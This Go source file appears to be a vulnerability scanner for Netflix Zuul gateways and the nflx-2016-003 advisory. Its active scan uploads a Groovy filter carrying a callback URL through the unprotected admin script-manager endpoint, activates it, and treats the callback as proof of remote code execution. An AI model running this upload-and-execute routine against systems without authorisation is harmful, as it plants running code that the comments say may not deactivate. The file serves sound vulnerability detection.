//Package gozuul provides methods to scan Netflix Zuul instances in relation to the Netflix nflx-2016-003 Security Advisory.
package gozuul

import (
	"bytes"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"

	"github.com/adevinta/gozuul/resources"
	"golang.org/x/net/html"
)

const (
	vcheckID            = "origin:Vulncheck:pre"
	filtersEndpoint     = "/admin/filterLoader.jsp"
	setFilterEndpoint   = "/admin/scriptmanager"
	uploadEndpoint      = "/admin/scriptmanager?action=UPLOAD"
	vcheckEndpoint      = "/vulncheck-spt"
	vulnerableDork      = "Usage: /scriptManager?action=<ACTION_TYPE>&<ARGS>"
	cassandraDork       = "HystrixCassandraPut"
	callbackPlaceholder = "http://__HOSTPORT_PLACEHOLDER__/callback/__SCAN_PLACEHOLDER__"
	vcheckFilename      = "Vulncheck.groovy"
)

// ResultSet contains the resulting details of a passive or active scan.
// PrevEnabled indicates whether the Vulncheck.groovy filter was previously
// enabled in the scanned target or not.
// AdminDisabled indicates if HTTP POSTing to the filter upload endpoint is
// forbidden.
// Vulnerable indicates wheter the target endpoint is vulnerable or not, while
// MightVulnerable indicates that the target is possibly vulnerable but can not
// be confirmed.
type ResultSet struct {
	PrevEnabled     bool
	AdminDisabled   bool
	Vulnerable      bool
	MightVulnerable bool
}

// PassiveScan executes a new passive scan against the specified target.
func PassiveScan(target string) (ResultSet, error) {
	rs := ResultSet{}

	if target == "" {
		return rs, fmt.Errorf("arguments can not be nil, target: %s", target)
	}

	res, err := upload(target+uploadEndpoint, newStrFile(""), "Emptyfile.groovy")
	if err != nil {
		return rs, err
	}
	defer res.Body.Close()

	switch res.StatusCode {
	case http.StatusBadRequest:
		body, err := ioutil.ReadAll(res.Body)
		if err != nil {
			return rs, err
		}
		rs.Vulnerable = strings.Contains(string(body), vulnerableDork)
	case http.StatusForbidden:
		// Possibly admin portal explicitly disabled. Not vulnerable case.
		rs.AdminDisabled = true
	}

	return rs, nil
}

// Active executes a new active scan against the specified target.
// The callback parameter is also a URL that wll be injected in the filter that
// will be uploaded to the target.
// The objective is to see whether a callback is received or not (what would be
// an evidence of RCE).
// The callback reception must be handled by the caller and, when a callback
// is received, the caller should write in the callbackRec channel.
func ActiveScan(target, callback string, callbackRec chan bool) (rs ResultSet, err error) {
	if target == "" {
		return rs, fmt.Errorf("target can not be empty, target: %s", target)
	} else if callbackRec == nil || cap(callbackRec) < 1 {
		return rs, fmt.Errorf("channel can not be nil and must be buffered. callbackRec: %s, capacity: %s", callbackRec, cap(callbackRec))
	}

	// Check if filter is already enabled before continue with the scan.
	enabled, err := isFilterEnabled(target + vcheckEndpoint)
	if err != nil {
		return rs, err
	} else if enabled == true {
		rs.PrevEnabled = true
		return rs, nil
	}

	// Get the biggest revision of the Vulnchek filter (if any).
	filters, err := recentFilters(target + filtersEndpoint)
	if err != nil {
		return rs, err
	}
	cRev := filters[vcheckID]

	// Upload the filter and handle response.
	if terminate, err := handleActiveUpload(target+uploadEndpoint, callback, &rs); terminate || (err != nil) {
		return rs, err
	}

	// Get again the biggest revision of the Vulnchek filter (if any).
	filters, err = recentFilters(target + filtersEndpoint)
	if err != nil {
		return rs, err
	}
	nRev := filters[vcheckID]

	// The caller should have written to the callbackRec channel if a callback
	// has been received. In that case, there's no need to execute more steps
	// to confirm that the target is vulnerable because receiving a callback
	// indicates that our code has been executed in the target.
	select {
	case <-callbackRec:
		rs.Vulnerable = true
		return rs, nil
	default:
		// Callback not received at this point. Continue with the filter checking approach.
		// The Callback might be received later, but as we have done another HTTP request
		// probably if we have not received it yet we will not receive it later.
	}

	if nRev <= cRev {
		return rs, fmt.Errorf("revision didn't increase after filter upload. prev: %s. curr: %s", cRev, nRev)
	}

	// Activate the filter and wait some time until it becomes active.
	err = activateFilterAndCheck(target, nRev, &rs)

	return rs, err
}

// activateFilterAndCheck activates the filter, waits some time until it becomes active,
// and checks whether it is enabled or not (what means that the target is vulnerable).
func activateFilterAndCheck(target string, nRev int, rs *ResultSet) error {
	if err := setFilterAction(target+setFilterEndpoint, vcheckID, "ACTIVATE", nRev); err != nil {
		return err
	}

	enabled := false

	// For a maximum of 63 seconds wait for the filter to become enabled,
	// increasing the waiting time twice every time.
	for i := 0; i < 6; i++ {
		var err error

		// Check if the filter is enabled. If it is, the target is vulnerable.
		enabled, err = isFilterEnabled(target + vcheckEndpoint)
		if err != nil {
			return err
		}

		if enabled {
			break
		}

		ts := 1 << uint(i) * time.Second
		time.Sleep(ts)
	}

	rs.Vulnerable = enabled
	if !enabled {
		return errors.New("unexpected error, filter seems to have been uploaded but not activated")
	}

	// Deactivate the filter. We did it as a good practice, but doesn't seems
	// to work in our tests (at least without restarting the target).
	if err := setFilterAction(target+setFilterEndpoint, vcheckID, "DEACTIVATE", nRev); err != nil {
		return err
	}

	return nil
}

// handleActiveUpload function handles the filter upload for the ActiveScan,
// reading the filter we want to inject and replacing the callback placeholder on it,
// uploading the file and handling the different responses that might be received.
// It returns a bool that indicates if the caller should continue with the Scan
// or if it should finish it returning the current ResultSet.
func handleActiveUpload(target, callback string, rs *ResultSet) (shouldReturn bool, err error) {
	r := strings.NewReplacer(callbackPlaceholder, callback)
	newVC := newStrFile(r.Replace(resources.Files[vcheckFilename]))

	res, err := upload(target, newVC, vcheckFilename)
	if err != nil {
		return true, err
	}
	defer res.Body.Close()

	switch res.StatusCode {
	case http.StatusFound:
		// Possibly vulnerable case. Continue with the checking process to verify.
		return false, nil
	case http.StatusForbidden:
		// Possibly admin portal explicitly disabled. Not vulnerable case.
		rs.AdminDisabled = true
	case http.StatusInternalServerError:
		// Might be vulnerable depending on the response body contents.
		body, err := ioutil.ReadAll(res.Body)
		if err != nil {
			return true, err
		}
		if strings.Contains(string(body), cassandraDork) {
			// Cassandra is not enabled, but might be vulnerable. The ability to receive the injected callback
			// is important to be sure if it is.
			rs.MightVulnerable = true
		}
		// A InternalServerError without the Cassandra dork shouldn't be vulnerable.
		// Other cases shouldn't be vulnerable neither.
	}

	return true, nil
}

// upload a file to the target URL and return the http.Response to be
// evaluated by the caller.
func upload(URL string, f multipart.File, filename string) (res *http.Response, err error) {
	// Prepare a form for submitting to that URL.
	var b bytes.Buffer
	w := multipart.NewWriter(&b)

	fw, err := w.CreateFormFile("upload", filename)
	if err != nil {
		return
	}

	if _, err = io.Copy(fw, f); err != nil {
		return
	}

	// Don't forget to close the multipart writer.
	// If you don't close it, your request will be missing the terminating boundary.
	w.Close()

	// Now that you have a form, you can submit it to your handler.
	req, err := http.NewRequest("POST", URL, &b)
	if err != nil {
		return
	}
	// Don't forget to set the content type, this will contain the boundary.
	req.Header.Set("Content-Type", w.FormDataContentType())

	// Submit the request
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	res, err = client.Do(req)

	return
}

func isFilterEnabled(URL string) (enabled bool, err error) {
	tin, err := quickGet(URL)
	if err != nil {
		return false, err
	}

	return tin.status == http.StatusOK && tin.body == "vulnerable", nil
}

// recentFilters gets the list of zuul filters present in the target.
// If a filter has more than one revision, it will return the biggest.
func recentFilters(URL string) (filters map[string]int, err error) {
	tin, err := quickGet(URL)
	if err != nil {
		return nil, err
	}

	if tin.status != http.StatusOK {
		return nil, fmt.Errorf("unexpected status code when accessing %s", URL)
	}

	doc, err := html.Parse(strings.NewReader(tin.body))
	if err != nil {
		return nil, err
	}

	filters = make(map[string]int)

	err = parseFilterLoader(doc, filters)

	return filters, err
}

// parseFilterLoader parses recursively the html.Nodes to get the href links.
// Those links should contain the IDs of the filters that the target owns,
// and their revision numbers.
func parseFilterLoader(n *html.Node, filters map[string]int) error {
	// Stop recursion.
	if n == nil {
		return nil
	}

	// Recursive calls for all the child of the current html.Node.
	for c := n.FirstChild; c != nil; c = c.NextSibling {
		if err := parseFilterLoader(c, filters); err != nil {
			return err
		}
	}

	// We are only interested on "a" elements.
	if n.Type != html.ElementNode || n.Data != "a" {
		return nil
	}

	// We are only interested in "href" attribute.
	for _, a := range n.Attr {
		if a.Key != "href" {
			continue
		}

		u, err := url.Parse(a.Val)
		if err != nil {
			return err
		}

		q := u.Query()

		// id will contain "origin:Vulncheck:pre" for the case of the vulncheck
		// filter.
		id := q["filter_id"][0]
		rev, err := strconv.Atoi(q["revision"][0])
		if err != nil {
			return err
		}

		// Only store the most recent revision.
		if rev > filters[id] {
			filters[id] = rev
		}
		break
	}

	return nil
}

// tinyHTTPRes contains the status and body of an http.Response.
type tinyHTTPRes struct {
	status int
	body   string
}

// quickGet makes a HTTP GET to the specified URL and returns the tinyHTTPRes
// related.
func quickGet(URL string) (tin *tinyHTTPRes, err error) {
	res, err := http.Get(URL)
	if err != nil {
		return
	}
	defer res.Body.Close()

	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return
	}

	return &tinyHTTPRes{res.StatusCode, string(body)}, nil
}

// setFilterAction makes a request to the target to change the action (state)
// of a zuul filter, for its specified revision.
func setFilterAction(URL, id, action string, rev int) error {
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	res, err := client.PostForm(URL, url.Values{"filter_id": {id}, "action": {action}, "revision": {strconv.Itoa(rev)}})
	if err != nil {
		return err
	}
	defer res.Body.Close()

	if res.StatusCode != http.StatusFound {
		return fmt.Errorf("unexpected response when setting Filter action. %s", res.Status)
	}

	return nil
}
